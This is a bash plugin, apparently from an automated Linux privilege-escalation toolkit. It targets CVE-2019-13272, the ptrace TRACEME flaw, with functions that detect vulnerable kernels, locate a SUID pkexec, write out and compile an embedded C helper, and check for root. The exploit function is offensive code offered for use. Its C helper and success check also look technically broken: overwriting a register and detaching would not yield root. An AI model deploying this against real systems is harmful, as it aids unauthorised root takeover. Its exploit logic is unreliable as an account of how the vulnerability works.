#!/bin/bash
# Ptrace (CVE-2019-13272) Plugin
PLUGIN_NAME="ptrace"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="CVE-2019-13272"
PLUGIN_DESCRIPTION="Ptrace TraceMe Local Privilege Escalation"

ptrace_detect() {
    log_message "Checking for Ptrace vulnerability..." "INFO"
    
    local major=$KERNEL_MAJOR
    local minor=$KERNEL_MINOR
    
    # CVE-2019-13272: 4.10+
    if [ "$major" -gt 4 ] || ([ "$major" -eq 4 ] && [ "$minor" -ge 10 ]); then
        # Check if ptrace is restricted
        if [ -f "/proc/sys/kernel/yama/ptrace_scope" ]; then
            local ptrace_scope
            ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
            if [ "$ptrace_scope" = "0" ]; then
                log_message "System VULNERABLE to Ptrace" "WARNING"
                return 0
            fi
        else
            log_message "System may be VULNERABLE to Ptrace" "WARNING"
            return 0
        fi
    fi
    
    log_message "System NOT vulnerable to Ptrace" "INFO"
    return 1
}

ptrace_exploit() {
    log_message "Attempting Ptrace exploitation..." "INFO"
    
    if ! ptrace_detect; then
        return 1
    fi
    
    # Ptrace exploit typically uses /usr/bin/pkexec or similar
    local pkexec_path="/usr/bin/pkexec"
    
    if [ ! -u "$pkexec_path" ]; then
        log_message "pkexec not SUID, trying alternative..." "WARNING"
        # Try to find another suitable target
        pkexec_path=$(find /usr -name "pkexec" -perm -4000 2>/dev/null | head -1)
    fi
    
    if [ -z "$pkexec_path" ]; then
        log_message "No suitable target for Ptrace exploit" "WARNING"
        return 1
    fi
    
    log_message "Using target: $pkexec_path" "INFO"
    
    # Create exploit script
    local exploit_script="${EXPLOIT_DIR}/ptrace_exploit.sh"
    cat > "$exploit_script" << 'SCRIPTEOF'
#!/bin/bash
# Ptrace exploit helper
cd /tmp
rm -rf ptrace_exploit 2>/dev/null
mkdir ptrace_exploit
cd ptrace_exploit

# Create helper
cat > helper.c << 'HELPEREOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>

int main(int argc, char **argv) {
    pid_t pid = fork();
    if (pid == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execve("/usr/bin/pkexec", (char *[]){"/usr/bin/pkexec", NULL}, NULL);
    } else {
        wait(NULL);
        ptrace(PTRACE_ATTACH, pid, NULL, NULL);
        wait(NULL);
        // Inject shellcode
        struct user_regs_struct regs;
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);
        // Set uid to 0
        regs.rax = 0;
        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
    }
    return 0;
}
HELPEREOF

gcc helper.c -o helper 2>/dev/null && ./helper
SCRIPTEOF
    
    chmod +x "$exploit_script"
    
    log_message "Running Ptrace exploit..." "INFO"
    timeout_exec $TIMEOUT_CRITICAL bash "$exploit_script" &
    spinner $!
    wait $! 2>/dev/null
    
    sleep 2
    if [ "$(id -u)" -eq 0 ]; then
        log_message "Ptrace exploit SUCCESSFUL!" "SUCCESS"
        return 0
    fi
    
    log_message "Ptrace exploit failed" "WARNING"
    return 1
}

ptrace_info() {
    cat << 'EOFINFO'
Ptrace (CVE-2019-13272)
=======================
A vulnerability in the Linux kernel's ptrace implementation that
allows local privilege escalation via PTRACE_TRACEME.

Affected: Linux kernel 4.10+
Impact: Local privilege escalation to root
Discovery: Jann Horn (Google Project Zero)
EOFINFO
}
